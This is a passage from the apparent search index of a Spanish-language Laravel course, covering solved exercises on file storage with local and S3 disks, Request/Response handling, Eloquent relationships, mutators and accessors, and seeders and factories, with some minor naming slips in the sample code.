crea un bucket S3 con acceso p\u00fablico. Configura el proyecto actual para utilizar el disco 's3' por defecto o bien util\u00edzalo de forma expl\u00edcita en cada interacci\u00edon que realices con el Storage.</li> </ol> Soluci\u00f3n <p>Crea el bucket S3 en AWS y configura en <code>.env</code>:</p> <pre><code>AWS_ACCESS_KEY_ID=your-access-key-id\nAWS_SECRET_ACCESS_KEY=your-secret-access-key\nAWS_DEFAULT_REGION=your-region\nAWS_BUCKET=your-bucket-name   \n</code></pre> <p>Aseg\u00farate que en <code>config/filesystems.php</code> tengas configurado el disco 's3':</p> <pre><code>&lt;?php\n's3' =&gt; [\n    'driver' =&gt; 's3',\n    'key' =&gt; env('AWS_ACCESS_KEY_ID'),\n    'secret' =&gt; env('AWS_SECRET_ACCESS_KEY'),\n    'region' =&gt; env('AWS_DEFAULT_REGION'),\n    'bucket' =&gt; env('AWS_BUCKET'),\n    'url' =&gt; env('AWS_URL'),\n],\n</code></pre> <p>Ahora, en la funci\u00f3n 'store' del controlador deber\u00e1s indicar que se almacene en el disco 's3':</p> <pre><code>&lt;?php\npublic function subirImagen(Request $request)\n{\n    $request-&gt;validate([\n        'imagen' =&gt; 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n    ]);\n\n    if ($request-&gt;file('imagen')) {\n        $path = $request-&gt;file('imagen')-&gt;store('imagenes', 's3');\n        return back()-&gt;with('success', 'Imagen subida correctamente.')-&gt;with('path', $path);\n    }\n\n    return back()-&gt;withErrors('Error al subir la imagen.');\n}\n</code></pre> <ol> <li>Mini Drive: De forma similar a lo que acabas de hacer con la galer\u00eda, crea un sistema de almecenamiento de archivos que admita archivos de diferente tipo (im\u00e1genes, videos, documentos...). Deber\u00e1s mostrar un listado con un icono seg\u00fan el tipo de archivo, su nombre, tama\u00f1o y opciones (eliminar), un formulario para subirlo con un campo en el que recojas el nombre con el que almacennarlo. Y en vez de la vista en detalle, al pulsar sobre el archivo en la vista del listado, se descargar\u00e1 directamente. Sigue las recomendaciones de los puntos anteriores.</li> </ol> Soluci\u00f3n <p>En la funci\u00f3n 'store' del formulario ahora deber\u00e1s cambiar el nombre del archivo conservando su extensi\u00f3n mediante getClientOriginalExtension():</p> <pre><code>&lt;?php\npublic function subirImagen(Request $request)\n{\n    $request-&gt;validate([\n        'imagen' =&gt; 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',\n    ]);\n\n    if ($request-&gt;file('imagen')) {\n        $nombreArchivo = time() . '.' . $request-&gt;file('imagen')-&gt;getClientOriginalExtension();\n        $path = $request-&gt;file('imagen')-&gt;storeAs('imagenes', $nombreArchivo, 'public');\n        return back()-&gt;with('success', 'Imagen subida correctamente.')-&gt;with('path', $path);\n    }\n\n    return back()-&gt;withErrors('Error al subir la imagen.');\n}\n</code></pre> <ol> <li>Mini Drive con directorios (opcional): Investiga c\u00f3mo crear directorios y mover archivos entre ellos. Ofrece en la interfaz que has creado, las opciones correspondientes para crear un nuevo directorio, para cambiar el nombre a un archivo (si no existe uno ya con dicho nombre) y moverlo a un directorio determinado. </li> </ol> Soluci\u00f3n <p>Crear un nuevo directorio:</p> <pre><code>&lt;?php\n// En el controlador\nuse Illuminate\\Support\\Facades\\Storage;\n\nStorage::makeDirectory('public/nueva_carpeta');\n</code></pre> <p>Si no tienes creado el enlace simb\u00f3lico desde 'public', ve a la ra\u00edz del proyecto y ejectua (s\u00f3lo se hace una vez):</p> <pre><code>php artisan storage:link\n</code></pre> <p>Ya es accesible la carpeta desde <code>http://tu-sitio.test/storage/nueva_carpeta</code>.</p> <p>Mover archivos entre directorios:</p> <pre><code>&lt;?php\npublic function moverArchivo($filename)\n{\n    $pathOrigen = 'imagenes/' . $filename;\n    $pathDestino = 'archivos/' . $filename;\n\n    if (Storage::disk('public')-&gt;exists($pathOrigen)) {\n        Storage::disk('public')-&gt;move($pathOrigen, $pathDestino);\n        return back()-&gt;with('success', 'Archivo movido correctamente.');\n    }\n\n    return back()-&gt;withErrors('El archivo no existe.');\n}\n</code></pre> <p>La ruta en <code>web.php</code> ser\u00eda as\u00ed:</p> <pre><code>&lt;?php\nRoute::post('/mover-archivo/{filename}', [ArchivoController::class, 'moverArchivo']);\n</code></pre>"},{"location":"09actividadesResueltas.html#request-y-response","title":"Request y response","text":"<p>En los siguientes ejercicios vas a trabajar con <code>Request</code>y <code>Response</code> en las funciones de los controladores. El primero ya lo has utilizado para recoger los datos recibidos de un formulario. Vas a repasar su uso y sobre todo, vas a conocer el segundo.</p> <ol> <li>Obtener y validar datos con Request: Crea un peque\u00f1o formulario para recoger \"Nombre\" y \"Email\" del usuario. Recoge sus datos en una funci\u00f3n del controlador y val\u00eddalos. Si pasan la validaci\u00f3n, s\u00edmplemente devuelve un mensaje \"Se ha pasado la validaci\u00f3n\" y si no, captura los errores en la vista del formulario.</li> </ol> Soluci\u00f3n <p>Funci\u00f3n en el controlador para obtener los datos del formulario:</p> <pre><code>&lt;?php\nuse Illuminate\\Http\\Request;\n\nclass UsuarioController extends Controller\n{\n    public function guardar(Request $request)\n    {\n        $validated = $request-&gt;validate([\n            'nombre' =&gt; 'required|string|max:255',\n            'email' =&gt; 'required|email|unique:users,email',\n        ]);\n\n        // Si no pasa la validaci\u00f3n, Laravel redirige al formulario con los errores\n\n        $nombre = $request-&gt;input('nombre');\n        $email = $request-&gt;input('email');\n\n        return \"Validaci\u00f3n correcta: Nombre: $nombre, Email: $email\";\n    }\n}\n</code></pre> <p>En la vista del formulario, mostrar los errores:</p> <pre><code> @if ($errors-&gt;any())\n    &lt;ul&gt;\n        @foreach ($errors-&gt;all() as $error)\n            &lt;li&gt;{{ $error }}&lt;/li&gt;\n        @endforeach\n    &lt;/ul&gt;\n@endif\n</code></pre> <ol> <li>Redireccionar la respuesta: Modifica el ejercicio anterior para redireccionar la respuesta a otra ruta.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\npublic function guardar(Request $request){\n    // ...\n    $mensaje = \"Validaci\u00f3n correcta: Nombre: $nombre, Email: $email\";\n    return redirect()-&gt;route('contacto.gracias')-&gt;with('success', $mensaje);\n}\n\npublic function gracias(){ return session('success'); }\n</code></pre> <ol> <li>Respuesta JSON: Crea una ruta GET <code>/api/usuarios</code> que devuelva un array de usuarios (id, nombre, email) en formato JSON.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\nuse Illuminate\\Http\\Request;\n\nclass ApiController extends Controller\n{\n    public function usuarios()\n    {\n        $usuarios = [\n            ['id' =&gt; 1, 'nombre' =&gt; 'Juan', 'email' =&gt; 'juan@example.com'],\n            ['id' =&gt; 2, 'nombre' =&gt; 'Ana', 'email' =&gt; 'ana@example.com'],\n        ];\n\n        return response()-&gt;json($usuarios);\n    }\n}\n</code></pre> <ol> <li>Respuesta JSON error: Crea una ruta GET <code>/api/error</code> que devuelva un array (error y mensaje) en formato JSON y adem\u00e1s, el c\u00f3digo de estado 400 para indicar al cliente que ha enviado una petici\u00f3n inv\u00e1lida.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\npublic function error()\n{\n    return response()-&gt;json([\n        'error' =&gt; 'Solicitud incorrecta',\n        'message' =&gt; 'Faltan datos en la solicitud.',\n    ], 400);\n}\n</code></pre> <ol> <li>Modificar cabeceras de la respuesta: Crea una ruta GET <code>/archivo/descargar</code> que devuelva un archivo descargable y modifique los encabezados de la respuesta. En el controlador, usa response()-&gt;download() para devolver el archivo estableciendo un encabezado personalizado.</li> </ol> Soluci\u00f3n <pre><code>&lt;?php\npublic function descargar()\n{\n    $file = public_path('archivos/ejemplo.pdf');\n    return response()-&gt;download($file, 'mi_archivo.pdf', [\n        'Content-Type' =&gt; 'application/pdf',\n    ]);\n}\n</code></pre> <ol> <li>Ejercicio completo: API Rest: Con lo visto hasta ahora, implementa una API RESTful para manejar usuarios:</li> </ol> <ul> <li>C: Crear un usuario mediante POST <code>/api/usuarios</code>.</li> <li>R: Listar usuarios con GET <code>/api/usuarios</code>.</li> <li>U: Actualizar un usuario con PUT <code>/api/usuarios/{id}</code>.</li> <li>D: Eliminar un usuario con DELETE <code>/api/usuarios/{id}</code>.</li> </ul> <p>Aseg\u00farate de devolver respuestas adecuadas en JSON y manejar los errores correctamente.</p>"},{"location":"09actividadesResueltas.html#eloquent-relaciones","title":"Eloquent: Relaciones","text":"<p>En este apartado vas a crear diferentes relaciones entre modelos.</p> <ol> <li>Relaci\u00f3n 1 a 1. </li> </ol> <ul> <li>Crea los modelos <code>Usuario</code> y <code>Perfil</code>. Cada usuario tiene un perfil, y cada perfil pertenece a un \u00fanico usuario.</li> <li>En las migraciones aseg\u00farate que las tablas tienen los siguientes campos:</li> <li><code>usuarios</code>: campos <code>id</code>, <code>nombre</code>, <code>email</code>.</li> <li><code>perfiles</code>: campos <code>id</code>, <code>usuario_id</code>, <code>telefono</code>, <code>direccion</code>.</li> <li>Define la relaci\u00f3n en los modelos.</li> </ul> Soluci\u00f3n <pre><code>// Modelo Usuario\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Usuario extends Model{\n    public function perfil(){\n        return $this-&gt;hasOne(Perfil::class);\n    }\n}\n\n// Modelo Perfil\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Perfil extends Model{\n    public function usuario(){\n        return $this-&gt;belongsTo(Usuario::class);\n    }\n}\n</code></pre> <ul> <li>Rellena con 2 \u00f3 3 registros manualmente o mediante Eloquent en ambas tablas/modelos.</li> <li>Consulta los datos de un usuario y muestra su perfil. Para ello, crea una ruta <code>usuario/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>usuario.show.blade.php</code> para los datos del usuario con su perfil.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function show(string $id){\n    $usuario = Usuario::find($id);\n    $perfil = $usuario-&gt;perfil; // Tambi\u00e9n se podr\u00eda recuperar el perfil en la vista\n    return view('usuario.show', compact('usuario', 'perfil'));\n}\n</code></pre> <ol> <li>Relaci\u00f3n 1 a Muchos. </li> </ol> <ul> <li>Crea los modelos <code>Categoria</code> y <code>Producto</code>. Cada categor\u00eda tiene muchos productos, pero un producto s\u00f3lo perteneca una determinada categor\u00eda.</li> <li>En las migraciones aseg\u00farate que las tablas tienen los siguientes campos:</li> <li><code>categorias</code>: campos <code>id</code>, <code>nombre</code>.</li> <li><code>productos</code>: campos <code>id</code>, <code>nombre</code>, <code>precio</code>, <code>categoria_id</code>.</li> <li>Define la relaci\u00f3n en los modelos.</li> </ul> Soluci\u00f3n <pre><code>// Modelo Categoria\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Categoria extends Model{\n    public function productos(){\n        return $this-&gt;hasMany(Producto::class);\n    }\n}\n\n// Modelo Prodcuto\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Producto extends Model{\n    public function categoria(){\n        return $this-&gt;belongsTo(Categoria::class);\n    }\n}\n</code></pre> <ul> <li>Rellena con 2 \u00f3 3 registros manualmente o mediante Eloquent en ambas tablas/modelos.</li> <li>Consulta el nombre de una categor\u00eda mostrando sus productos. Para ello, crea una ruta <code>categoria/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>categoria.show.blade.php</code>.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function show(string $id){\n    $categoria = Categoria::find($id);\n    $productos = $categoria-&gt;productos; // Tambi\u00e9n se podr\u00eda hacer esto en la vista\n    return view('categoria.show', compact('categoria', 'productos'));\n}\n</code></pre> <ul> <li>Mediante Eloquent agrega un nuevo producto a la categor\u00eda con id pasado por par\u00e1metro. Para ello, crea una ruta <code>categoria/{id}/addproduct/{nombre}</code> que redirija a la funci\u00f3n <code>addProduct</code> del controlador y redirija a la ruta <code>show</code> anterior que llama a la vista <code>categoria.show.blade.php</code>.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function addProduct(string $id, string $nombre){\n    $categoria = Categoria::find($id);\n    $categoria-&gt;productos()-&gt;create(['nombre' =&gt; $nombre]);\n\n    return redirect()-&gt;route('categoria.show', ['id' =&gt; $id]);\n}\n</code></pre> <ol> <li>Relaci\u00f3n Muchos a Muchos. </li> </ol> <ul> <li>Crea los modelos <code>Estudiante</code> y <code>Asignatura</code>. Cada estudiante puede est\u00e1r matriculado en muchas asignaturas y una asignatura la cursan muchos estudiantes.</li> <li>En las migraciones aseg\u00farate que las tablas tienen los siguientes campos:</li> <li><code>estudiantes</code>: campos <code>id</code>, <code>nombre</code>.</li> <li><code>asignaturas</code>: campos <code>id</code>, <code>nombre</code>.</li> <li><code>asignatura_estudiante</code> (tabla pivote): <code>estudiante_id</code>, <code>asignatura_id</code>.</li> <li>Define la relaci\u00f3n en los modelos.</li> </ul> Soluci\u00f3n <pre><code>// Modelo Estudiante\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Estudiante extends Model{\n    public function asignaturas(){\n        return $this-&gt;belongsToMany(Asignatura::class);\n    }\n}\n\n// Modelo Asignatura\nuse Illuminate\\Database\\Eloquent\\Model;\n\nclass Asignatura extends Model{\n    public function estudiantes(){\n        return $this-&gt;belongsToMany(Estudiante::class);\n    }\n}\n</code></pre> <ul> <li>Rellena con 2 \u00f3 3 registros manualmente o mediante Eloquent en ambas tablas/modelos.</li> <li>Consulta todas las asignaturas de un estudiante por su id. Para ello, crea una ruta <code>estudiante/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>estudiante.show.blade.php</code>.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function show(string $id){\n    $estudiante = Estudiante::find($id);\n    $asignaturas = $estudiante-&gt;asignaturas; // Tambi\u00e9n se podr\u00eda hacer esto en la vista\n    return view('estudiante.show', compact('estudiante', 'asignaturas'));\n}\n</code></pre> <ul> <li>Consulta ahora todos los estudiantes que cursen una asignatura por su id. Para ello, crea una ruta <code>asignatura/{id}</code> que redirija a la funci\u00f3n <code>show</code> del controlador y llame a la vista <code>asignatura.show.blade.php</code>.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function show(string $id){\n    $asignatura = Asignatura::find($id);\n    $estudiantes = $asignatura-&gt;estudiantes; // Tambi\u00e9n se podr\u00eda hacer esto en la vista\n    return view('asignatura.show', compact('asignatura', 'estudiantes'));\n}\n</code></pre> <ul> <li>Mediante Eloquent matricula a un estudiante en un curso determinado. Para ello, crea una ruta <code>estudiante/{id}/matricula/{idCurso}</code> que redirija a la funci\u00f3n <code>matricula</code> del controlador y redirija a la ruta <code>show</code> de estudiante que llama a la vista <code>estudiante.show.blade.php</code>.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function matricula(string $id, string $idCurso){\n    $estudiante = Estudiante::find($id);\n    $estudiante-&gt;cursos()-&gt;attach($idCurso);\n\n    return redirect()-&gt;route('estudiante.show', ['id' =&gt; $id]);\n}\n</code></pre> <ul> <li>Mediante Eloquent desmatricula a un estudiante en un curso determinado. Para ello, crea una ruta <code>estudiante/{id}/desmatricula/{idCurso}</code> que redirija a la funci\u00f3n <code>desmatricula</code> del controlador y redirija a la ruta <code>show</code> de estudiante que llama a la vista <code>estudiante.show.blade.php</code>.</li> </ul> Soluci\u00f3n <pre><code>// En el controlador\npublic function desmatricula(string $id, string $idCurso){\n    $estudiante = Estudiante::find($id);\n    $estudiante-&gt;cursos()-&gt;detach($idCurso);\n\n    return redirect()-&gt;route('estudiante.show', ['id' =&gt; $id]);\n}\n</code></pre> <ol> <li>Ejercicio completo: CRUD con varias relaciones y formularios.</li> </ol> <ul> <li>Implementa un sistema de gesti\u00f3n de posts con sus respectivos comentarios mediante los modelos <code>Autor</code>, <code>Post</code> y <code>Comentario</code>.</li> <li>Piensa bien las relaciones a utilizar. Un autor puede escribir muchos posts y comentarios. Un post puede tener muchos comentarios. Un comentario s\u00f3lo pertenece a un post y est\u00e1 escrito por un autor.</li> <li>De un autor interesa saber su imagen, nombre y email.</li> <li>De un post interesa saber su t\u00edtulo, fecha y descripci\u00f3n.</li> <li>De un comentario interesa saber su texto y fecha.</li> <li>Crea los CRUDs necesarios para cada modelo con sus rutas espec\u00edficas, controladores, vistas (con formularios)...</li> </ul>"},{"location":"09actividadesResueltas.html#mutadores-y-accesores","title":"Mutadores y accesores","text":"<ol> <li>Formatear nombres y convertir n\u00fameros: En el modelo <code>Producto</code> del ejercicio anterior, crea:</li> </ol> <ul> <li>Un mutador que almacene el nombre en min\u00fasculas y un accesor que los devuelva con la primera letra en may\u00fascula.</li> <li>Un mutador que almacene el precio convertido a c\u00e9ntimos y un accesor que lo devuelva de nuevo en euros.</li> </ul> Soluci\u00f3n <pre><code>namespace App\\Models;\nuse Illuminate\\Database\\Eloquent\\Model;\nuse Illuminate\\Database\\Eloquent\\Casts\\Attribute;\n\nclass Producto extends Model{\n    protected $fillable = ['nombre', 'precio'];\n\n    protected function nombre(): Attribute{\n        return Attribute::make(\n            set: fn ($value) =&gt; strtolower($value), // Guardar en min\u00fasculas\n            get: fn ($value) =&gt; ucfirst($value) // Devolver con la 1\u00aa en may\u00fasculas\n        );\n    }\n\n    protected function precio(): Attribute{\n        return Attribute::make(\n            set: fn ($value) =&gt; $value * 100, // Guardar en c\u00e9ntimos\n            get: fn ($value) =&gt; $value / 100  // Devolver en euros\n        );\n    }\n}\n</code></pre> <ol> <li>Slug autom\u00e1tico: Un slug es una versi\u00f3n formateada de un texto, generalmente usada en URLs por gestores de contenidos. Un slug se crea eliminando caracteres especiales, convirtiendo espacios en guiones y pasando a min\u00fasculas el texto. Por ejemplo: \"Hola Mundo Laravel\" tendr\u00eda de slug \"hola-mundo-laravel\".</li> </ol> <p>En el modelo <code>Post</code> del ejercicio anterior:</p> <ul> <li>Crea la migraci\u00f3n correspondiente para a\u00f1adir el campo <code>slug</code> de tipo string.</li> <li>Investiga c\u00f3mo usar <code>Str::slug</code> para generar slugs.</li> <li>Crea un mutador que convierta el t\u00edtulo a slug y lo almacene en el campo <code>slug</code>.</li> </ul> Soluci\u00f3n <pre><code>&lt;?php\nnamespace App\\Models;\nuse Illuminate\\Database\\Eloquent\\Model;\nuse Illuminate\\Database\\Eloquent\\Casts\\Attribute;\nuse Illuminate\\Support\\Str;\n\nclass Post extends Model{\n    protected $fillable = ['titulo', 'fecha', 'descripcion', 'slug'];\n\n    protected function titulo(): Attribute{\n        return Attribute::make(\n            set: function ($value) {\n                return [\n                    'titulo' =&gt; $value,\n                    'slug' =&gt; Str::slug($value)\n                ];\n            }\n        );\n    }\n}\n</code></pre> <ol> <li>Formatear fechas de creaci\u00f3n: En el modelo <code>Estudiante</code> del ejercicio anterior:</li> </ol> <ul> <li>Investiga c\u00f3mo usar la biblioteca <code>Carbon</code> para trabajar con fechas incluida en Laravel.</li> <li>Crea un accesor que formatee la fecha de creaci\u00f3n (created_at) en formato \"d/m/Y - H:i\".</li> </ul> Soluci\u00f3n <pre><code>&lt;?php\nnamespace App\\Models;\nuse Illuminate\\Database\\Eloquent\\Model;\nuse Illuminate\\Database\\Eloquent\\Casts\\Attribute;\nuse Carbon\\Carbon;\n\nclass Estudiante extends Model{\n    protected $fillable = ['nombre'];\n\n    protected function createdAt(): Attribute{\n        return Attribute::make(\n            get: fn ($value) =&gt; Carbon::parse($value)-&gt;format('d/m/Y - H:i')\n        );\n    }\n}\n\n// Uso en controlador o vista\necho $estudiante-&gt;created_at; // 04/02/2025 - 15:30\n</code></pre>"},{"location":"09actividadesResueltas.html#seeders-y-factories","title":"Seeders y factories","text":"<ol> <li>Seeder b\u00e1sico: Crea un nuevo modelo <code>Usuario</code> con campos <code>nombre</code>, <code>email</code> y <code>password</code> (en su migraci\u00f3n) y crea un seeder <code>UsuarioSeeder</code> que inserte 3 usuarios de prueba en la base de datos.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:seeder UsuarioSeeder</code></p> <pre><code>&lt;?php\nuse App\\Models\\Usuario;\nuse Illuminate\\Database\\Seeder;\n\nclass UsuarioSeeder extends Seeder\n{\n    public function run()\n    {\n        Usuario::create([\n            'nombre' =&gt; 'Juan P\u00e9rez',\n            'email' =&gt; 'juan@example.com',\n            'password' =&gt; bcrypt('password123'),\n        ]);\n\n        Usuario::create([\n            'nombre' =&gt; 'Ana G\u00f3mez',\n            'email' =&gt; 'ana@example.com',\n            'password' =&gt; bcrypt('password123'),\n        ]);\n\n        Usuario::create([\n            'nombre' =&gt; 'Adri\u00e1n Lara',\n            'email' =&gt; 'adrian@example.com',\n            'password' =&gt; bcrypt('password123'),\n        ]);\n    }\n}\n</code></pre> <p>A\u00f1adir al <code>DatabaseSeeder</code>:</p> <pre><code>&lt;?php\nclass DatabaseSeeder extends Seeder\n{\n    public function run()\n    {\n        $this-&gt;call([\n            UsuarioSeeder::class,\n            // ...\n        ]);\n    }\n}\n</code></pre> <p>Ejecuta: <code>php artisan db:seed --class=UsuarioSeeder</code></p> <ol> <li>Factor\u00eda con seeder: Crea una factor\u00eda <code>UsuarioFactory</code> con datos fake y en el seeder <code>UsuarioSeeder</code> crea 10 usuarios mediante la factor\u00eda.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:factory UsuarioFactory -m Usuario</code></p> <pre><code>&lt;?php\nnamespace Database\\Factories;\nuse App\\Models\\Usuario;\nuse Illuminate\\Database\\Eloquent\\Factories\\Factory;\n\nclass UsuarioFactory extends Factory{\n    protected $model = Usuario::class; // Se podr\u00eda obviar \n\n    public function definition(): array{\n        return [\n            'nombre' =&gt; $faker-&gt;name,\n            'email' =&gt; $faker-&gt;unique()-&gt;safeEmail,\n            'password' =&gt; bcrypt('password123'),\n        ];\n    }\n}\n</code></pre> <p>En el modelo <code>Usuario</code> a\u00f1adir el trait <code>use HasFactory</code> para asociarlos:</p> <pre><code>&lt;?php\nclass Usuario extends Model{\n    use HasFactory;\n    // ...\n}\n</code></pre> <p>En el seeder <code>UsuarioSeeder</code> creado en el ejercicio anterior, a\u00f1ade:</p> <pre><code>&lt;?php\nuse App\\Models\\Usuario;\nuse Illuminate\\Database\\Seeder;\n\nclass UsuarioSeeder extends Seeder\n{\n    public function run()\n    {\n        // ...\n        User::factory(10)-&gt;create();\n    }\n}\n</code></pre> <p>Ejecuta: <code>php artisan db:seed --class=UsuarioSeeder</code></p> <ol> <li>Seeders con modelos relacionados: Crea el modelo <code>Publicacion</code> con los campos <code>titulo</code>, <code>contenido</code> y <code>usuario_id</code> (en su migraci\u00f3n) y modifica los modelos para que un usuario se relacione con muchas publicaciones. Crea las factor\u00edas <code>UsuarioFactory</code> (ya la tienes) y <code>PublicacionFactory</code> con datos fake para utilizar en el seeder <code>UsuarioPublicacionSeeder</code> para crear 10 usuarios que tentan entre 1 y 5 publicaciones cada uno.</li> </ol> Soluci\u00f3n <p>Ejecuta: <code>php artisan make:factory PublicacionFactory -m Publicacion</code></p> <pre><code>&lt;?php\nnamespace Database\\Factories;\nuse App\\Models\\Publicacion;\nuse Illuminate\\Database\\Eloquent\\Factories\\Factory;\n\nclass PublicacionFactory extends Factory{\n    protected $model = Publicacion::class; // Se podr\u00eda obviar \n\n    public function definition(): array{\n        return [\n            'titulo' =&gt; $faker-&gt;sentence,\n            'contenido' =&gt; $faker-&gt;paragraph,\n            'user_id' =&gt; 1, // Esto ser\u00e1 modificado en el Seeder\n        ];\n    }\n}\n</code></pre> <p>En el modelo <code>Publicacion</code> a\u00f1adir el trait <code>use HasFactory</code> para asociarlos:</p> <pre><code>&lt;?php\nclass Usuario extends Model{\n    use HasFactory;\n    // ...\n}\n</code></pre> <p>Ejecuta: <code>php artisan make:seeder UsuarioPublicacionSeeder</code></p> <pre><code>&lt;?php\nuse App\\Models\\Usuario;\nuse App\\Models\\Publicacion;\nuse Illuminate\\Database\\Seeder;\n\nclass UsuarioPublicacionSeeder extends Seeder\n{\n    public function run()\n    {\n        // Crear 10 usuarios\n        User::factory(10)-&gt;create()-&gt;each(function ($user) {\n            // Crear entre 1 y 5 posts para cada usuario\n            $user-&gt;posts()-&gt;createMany(Post::factory(rand(1, 5))-&gt;make()-&gt;toArray());\n        });\n    }\n}\n</code></pre> <p>A\u00f1adir al <code>DatabaseSeeder</code>:</p> <pre><code>&lt;?php\nclass DatabaseSeeder extends Seeder\n{\n    public function run()\n    {\n        $this-&gt;call([\n            UsuarioPublicacionSeeder::class,\n            // ...\n        ]);\n    }\n}\n</code></pre> <p>Ejecuta: <code>php artisan db:seed --class=UsuarioPublicacionSeeder</code></p>"},{"location":"09laravelAvanzado.html","title":"Uso avanzado de Laravel","text":"<p>Duraci\u00f3n estimada: 10 sesiones</p>"},{"location":"09laravelAvanzado.html#91-manejo-de-ficheros","title":"9.1 Manejo de ficheros","text":"<p>Laravel proporciona una API sencilla y potente para trabajar con ficheros mediante el uso del sistema de almacenamiento basado en Flysystem. Esto permite interactuar con el sistema de archivos local y servicios en la nube como Amazon S3 o Dropbox de manera uniforme.</p>"},{"location":"09laravelAvanzado.html#configuracion-del-almacenamiento","title":"Configuraci\u00f3n del almacenamiento","text":"<p>Laravel usa la configuraci\u00f3n del sistema de archivos en <code>config/filesystems.php</code>. El driver por defecto es <code>local</code>, pero se pueden configurar otros como <code>s3</code> o <code>public</code>.</p> <pre><code>&lt;?php\n// Configuraci\u00f3n del disco local privado, p\u00fablico y o s3\nreturn [\n    'default' =&gt; env('FILESYSTEM_DISK', 'local'), // local | public | s3\n\n       'disks' =&gt; [\n\n          'local' =&gt; [\n              'driver' =&gt; 'local',\n              'root' =&gt; storage_path('app/private'),\n              'serve' =&gt; true,\n              'throw' =&gt; false,\n              'report' =&gt; false,\n          ],\n\n          'public' =&gt; [\n              'driver' =&gt; 'local',\n              'root' =&gt; storage_path('app/public'),\n              'url' =&gt; env('APP_URL').'/storage',\n              'visibility' =&gt; 'public',\n              'throw' =&gt; false,\n              'report' =&gt; false,\n          ],\n\n          's3' =&gt; [\n              'driver' =&gt; 's3',\n              'key' =&gt; env('AWS_ACCESS_KEY_ID'), // Definidas en .env\n              'secret' =&gt; env('AWS_SECRET_ACCESS_KEY'),\n              'region' =&gt; env('AWS_DEFAULT_REGION'),\n              'bucket' =&gt; env('AWS_BUCKET'),\n              'url' =&gt; env('AWS_URL'),\n              'endpoint' =&gt; env('AWS_ENDPOINT'),\n              'use_path_style_endpoint' =&gt; env('AWS_USE_PATH_STYLE_ENDPOINT', false),\n              'throw' =&gt; false,\n              'report' =&gt; false,\n          ],\n      ],\n];\n</code></pre>"},{"location":"09laravelAvanzado.html#almacenar-archivos","title":"Almacenar archivos","text":"<p>Para subir y guardar archivos en Laravel, se utiliza la clase <code>Illuminate\\Support\\Facades\\Storage</code>. A sus m\u00e9todos se les pasa el path y nombre del archivo con el que operar. Hay que tener en cuenta que el path se indica a partir del disco configurado en el punto anterior, as\u00ed que, si por ejemplo queremos almacenar un archivo en <code>/storage/app/private/archivos</code> \u00fanicamente habr\u00eda que indicar como path <code>archivos</code>.</p> <pre><code>&lt;?php\n// Funci\u00f3n 'storage' en controlador que recibe los datos del formulario\nuse Illuminate\\Support\\Facades\\Storage;\n\n// 'imagen' es el atributo name del input type file del formulario\n$request-&gt;validate([\n    'imagen' =&gt; 'required|image|mimes:jpeg,png,jpg,gif|max:2048',\n]);\n\n// Opci\u00f3n 1.1 Guardar un archivo en el disco 'local' ('storage/app/private/archivos/')\n$path = Storage::put('archivos', $request-&gt;file('imagen')); // Storage siempre a `local` por defecto \n$path = Storage::disk('public')-&gt;put('archivos', $request-&gt;file('imagen')); // Elegir el disco al que guardar \n\n// Opci\u00f3n 1.2: Guardar archivo con nombre espec\u00edfico\n$path = Storage::putFileAs('archivos', $request-&gt;file('imagen'), 'mi_imagen.jpg');\n\n // Opci\u00f3n 2.1: Guardar desde $request\n$path = $request-&gt;file('imagen')-&gt;store('archivos'); // 'local' por defecto --&gt; Guarda en 'storage/app/private/archivos/'\n$path = $request-&gt;file('imagen')-&gt;store('archivos', 'public'); // 'public' --&gt; Guarda en 'storage/app/public/archivos/'\n\n// Opci\u00f3n 2.2: Guardar desde $request con nombre espec\u00edfico\n$path = $request-&gt;file('archivo')-&gt;storeAs('archivos', 'nuevonombre.jpg', 'public');\n\nreturn back()-&gt;with('success', 'Imagen subida con \u00e9xito a la ruta:' . $path); // Vuelve atr\u00e1s pasando la variable 'success' por la sesi\u00f3n  \n</code></pre>"},{"location":"09laravelAvanzado.html#obtener-archivos","title":"Obtener archivos","text":"<p>Cuando accedamos al storage siempre va a buscar a partir del directorio correspondiente al disco configurado en filesystem.</p> <pre><code>&lt;?php\n// Obtener el contenido de un archivo (con ficheros de texto, no im\u00e1genes)\n$contenido = Storage::get('archivos/mi_archivo.pdf');\necho $contenido;\n\n// Verificar si un archivo existe del disco 'local' o del 'public'\nif (Storage::exists('archivos/mi_archivo.pdf')) echo \"El archivo existe.\";\nif (Storage::disk('public')-&gt;exists('archivos/mi_archivo.pdf')) echo \"El archivo existe.\";\n\n// Descargar un archivo\nreturn Storage::download('archivos/mi_archivo.pdf');\n</code></pre>"},{"location":"09laravelAvanzado.html#eliminar-archivos","title":"Eliminar archivos","text":"<pre><code>&lt;?php\n// Eliminar un archivo del disco 'local' o del 'public'\nStorage::delete('archivos/mi_archivo.pdf');\nStorage::disk('public')-&gt;delete('archivos/mi_archivo.pdf');\n// Eliminar m\u00faltiples archivos\nStorage::delete(['archivos/archivo1.pdf', 'archivos/archivo2.pdf']);\n</code></pre>"},{"location":"09laravelAvanzado.html#listar-archivos-y-directorios","title":"Listar archivos y directorios","text":"<pre><code>&lt;?php\n// Obtener todos los archivos de un directorio del disco 'local' o del 'public'\n$archivos = Storage::files('archivos');\n$archivos = Storage::disk('public')-&gt;files('archivos');\nprint_r($archivos);\n// Obtener todos los archivos de un directorio incluyendo subdirectorios\n$archivos = 